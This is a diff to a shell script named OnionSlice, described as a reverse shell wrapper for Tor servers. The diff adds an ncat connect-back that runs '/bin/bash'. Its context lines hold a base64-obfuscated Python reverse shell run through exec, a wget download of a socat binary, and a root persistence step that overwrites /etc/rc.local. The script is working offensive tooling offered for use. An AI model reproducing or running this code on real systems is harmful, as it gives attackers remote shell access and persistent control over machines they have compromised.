@@ -5,15 +5,15 @@
 ##### Reverse Shell Wrapper, Written with tor servers in mind. Multiple langs for shell.
 #### Python, ruby or nc for connect back.
 ## 
-#
-##
-##################################################################################
-#  ██████╗ ███╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗██╗     ██╗ ██████╗███████╗  ##
-# ██╔═══██╗████╗  ██║██║██╔═══██╗████╗  ██║██╔════╝██║     ██║██╔════╝██╔════╝ ##
-# ██║   ██║██╔██╗ ██║██║██║   ██║██╔██╗ ██║███████╗██║     ██║██║     █████╗   #
-# ██║   ██║██║╚██╗██║██║██║   ██║██║╚██╗██║╚════██║██║     ██║██║     ██╔══╝   ##
-# ╚██████╔╝██║ ╚████║██║╚██████╔╝██║ ╚████║███████║███████╗██║╚██████╗███████╗  ##            
-##################################################################################
+# Version 1.2
+##                                                                                    
+                                                                                      \@/
+#  ██████╗ ███╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗██╗     ██╗ ██████╗███████╗    ######### #
+# ██╔═══██╗████╗  ██║██║██╔═══██╗████╗  ██║██╔════╝██║     ██║██╔════╝██╔════╝   ##(@)###(@)##
+# ██║   ██║██╔██╗ ██║██║██║   ██║██╔██╗ ██║███████╗██║     ██║██║     █████╗     #####    ####
+# ██║   ██║██║╚██╗██║██║██║   ██║██║╚██╗██║╚════██║██║     ██║██║     ██╔══╝      #####  ####
+# ╚██████╔╝██║ ╚████║██║╚██████╔╝██║ ╚████║███████║███████╗██║╚██████╗███████╗##     #/\###  
+                                                                                       
 #
 ##
 ###
@@ -48,7 +48,8 @@ cd $activeDir
 
 # Check for presence of socat on system
 # Download it if we don't have it
-if [ ! $(which socat) == "" ];then
+
+if [ -x "$(socat -v foo)" ];then
     wget -O $activeDir/socat $scBinUrl
     chmod 775 socat
     socat=".$activeDir/socat"
@@ -59,11 +60,13 @@ fi
 
 
 
-# check for python, if not python check for nc, if no nc check for ruby. if no ruby, bail.
+# check for python, if not python check for nc, if no nc check for ruby. if no ruby, if no perl... telnet?.
 
 
 if [ ! $(which python) == "" ];then
   using=python
+  elif [ ! $(which ncat) == "" ];then
+      using=ncat
   elif [ ! $(which nc) == "" ];then
       using=nc
       elif [ ! $(which ruby) == "" ];then
@@ -82,6 +85,13 @@ if [[ $using == "python" ]];then
 cat << _EOF_ > $activeDir/$pName
 #!/usr/bin/env python
 exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzEyNy4wLjAuMScsNDQzMCkpClFvPUZhbHNlCndoaWxlIG5vdCBRbzoKCWRhdGE9c28ucmVjdigxMDI0KQoJaWYgbGVuKGRhdGEpPT0wOgoJCVFvPVRydWUKCXN0ZGluLHN0ZG91dCxzdGRlcnIsPW9zLnBvcGVuMyhkYXRhKQoJc3Rkb3V0X3ZhbHVlPXN0ZG91dC5yZWFkKCkrc3RkZXJyLnJlYWQoKQoJc28uc2VuZChzdGRvdXRfdmFsdWUpCg=='.decode('base64'))
+_EOF_
+
+# if we are using nc...
+elif [[ $using == "ncat" ]];then
+cat << _EOF_ > $activeDir/$pName
+#!/bin/sh
+ncat 127.0.0.1 4430 -e /bin/bash
 _EOF_
 
 # if we are using nc...
@@ -142,7 +152,7 @@ fi
 
 # Make persistent if possible
 if [[ $(whoami) == "root" ]];then
-    # Hey, its in the beta stage...
+    # Hey, its in the beta stage...should append itself rather than rewriting the file.
     echo "#!/bin/sh" > /etc/rc.local
     echo "/usr/local/sbin/$run" >> /etc/rc.local
     echo "exit0" >> /etc/rc.local
